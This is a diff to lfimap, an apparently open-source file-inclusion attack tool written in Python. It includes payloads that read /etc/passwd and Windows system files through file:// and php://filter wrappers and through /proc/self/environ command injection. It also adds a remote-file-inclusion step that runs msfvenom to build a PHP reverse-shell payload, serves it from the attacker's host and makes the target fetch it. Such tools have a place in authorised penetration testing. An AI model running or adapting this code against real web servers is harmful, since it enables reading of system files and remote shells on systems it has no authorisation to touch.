@@ -28,7 +28,7 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
 def serve_forever():
     socketserver.TCPServer.allow_reuse_address = True
     
-    with socketserver.TCPServer(("", 8801), ServerHandler) as httpd:
+    with socketserver.TCPServer(("", 80), ServerHandler) as httpd:
 
         if(args.verbose):
             print("[i] Opening local web server and setting up 'rfitest.txt' that will be used as test inclusion")
@@ -89,11 +89,11 @@ def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attack
 
 def test_file_wrapper(url):
     if(args.verbose):
-        print("Testing with file:// wrapper")
+        print("Testing file wrapper inclusion")
     
     testL = []
     testL.append("file:///etc/passwd")
-    testL.append("file://%2Fetc%2Fpasswd")
+    testL.append("file/etc/passwd")
 
     for i in range(len(testL)):
         u = url.replace(args.param, testL[i])
@@ -138,11 +138,11 @@ def test_trunc(url):
             if(not args.no_stop):
                 f.close()
                 break
-            else: continue
     
-    if(args.verbose): print("Testing /proc/self/environ inclusion via User-Agent")
-    test_self_environ(url)
+            if(args.verbose): print("Testing /proc/self/environ inclusion via User-Agent")
+            test_self_environ(url)
 
+    
 def test_self_environ(url):
     testL = []
     testL.append("/proc/self/environ&cmd=cat%20/etc/passwd")
@@ -168,13 +168,11 @@ def test_php_filter(url):
     testL = []
     testL.append("php://filter/resource=/etc/passwd")
     testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
-    testL.append("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
     testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
     
     testW = []
     testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
     testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
-    testW.append("php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts")
     testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
     
     #Linux
@@ -387,31 +385,31 @@ def test_rfi(url):
         try:
             threading.Thread(target=serve_forever).start()
             
-            u = url.replace(args.param, "http://{0}:8801/rfitest.txt".format(args.lhost))
-            res = requests.get(u, headers = headers, proxies = proxies)
+            u = url.replace(args.param, "http://{0}:80/rfitest.txt".format(args.lhost))
+            res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
 
             if(checkPayload(res)):
-                getExploit(res, 'GET', 'RFI', u, '', headers, 'RFI', '')
+                getExploit(res, 'GET', 'RFI', url.replace(args.param, 'CMD'), '', headers, 'RFI', '')
                 print("[+] RFI -> "+ u)
         except:
-            raise
+            pass
     else:
         if(args.verbose):
-            print("[i] Testing RFI using internet source. If you want to test RFI on local web server specify '-r' and '--lhost' parameters")
+            print("[i] Trying to include 'https://google.com'. If target has no access to internet use '--lhost' parameter for local RFI test")
 
     #Internet RFI test
     if(args.param in url):
         pyld = "https%3a//www.google.com/"
         u = url.replace(args.param, pyld)
     try:
-        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
+        res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
         if(checkPayload(res)):
             tempUrl = u.replace(pyld, 'CMD')
             getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
             print("[+] RFI -> " + u)
 
     except:
-        raise
+        pass
 
     if(args.revshell):
         exploit(exploits, 'RFI')
@@ -697,15 +695,24 @@ def exploit(exploits, method):
                 #TODO
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
-            #url = exploit['GETVAL']
-            #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
-            #res = requests.get(u, headers = headers, proxies = proxies)
-            pass
-     
-def lfimap_cleanup():
-    if(os.path.exists("rfitest.txt")):
-        os.remove("rfitest.txt")
+            url = exploit['GETVAL']
 
+            if(args.verbose): print("Building msfvenom RFI payload as 'rev.php'...")
+            command = "sudo msfvenom -p php/reverse_php LHOST=" + ip + " LPORT=" + str(port) + " > rev.php 2>&1" 
+            os.system(command)
+            
+            #PHP reverse shell
+            if(args.verbose): printInfo(ip, port, 'php', 'Remote File Inclusion. Please wait a few seconds')
+            requests.get(url.replace('CMD', 'http://' +ip+'/rev.php'), headers = headers, proxies = proxies)
+            
+
+def lfimap_cleanup():
+    if(os.path.exists('rfitest.txt')):
+        os.remove('rfitest.txt')
+    if(os.path.exists('exploit.txt')):
+        os.remove('exploit.txt')
+    if(os.path.exists('rev.php')):
+        os.remove('rev.php')
     os._exit(0)
 
 def main():
@@ -733,6 +740,7 @@ def main():
     if(args.trunc):
         default = False
         test_trunc(url)
+        test_file_wrapper(url)
     if(args.php_filter):
         default = False
         test_php_filter(url)
@@ -808,7 +816,7 @@ if(__name__ == "__main__"):
             sys.exit()
     elif(args.lhost):
         if(os.getuid() != 0):
-            print("[-] Cannot run LHOST file inclusion test as non admin user. Please run lfimap as admin/root. Exiting...")
+            print("[-] Cannot run RFI test as non admin user. Please run lfimap as admin/root. Exiting...")
             sys.exit()
 
     urlRegex = re.compile(
@@ -830,7 +838,7 @@ if(__name__ == "__main__"):
     #Checks if provided wordlist exists
     if(wordlist is not None):
         if(not os.path.isfile(wordlist)):
-            print("[-] Specified wordlist doesn't exist. Exiting...")
+            print("[-] Specified wordlist '"+ wordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
         wordlist = "wordlists/short.txt"
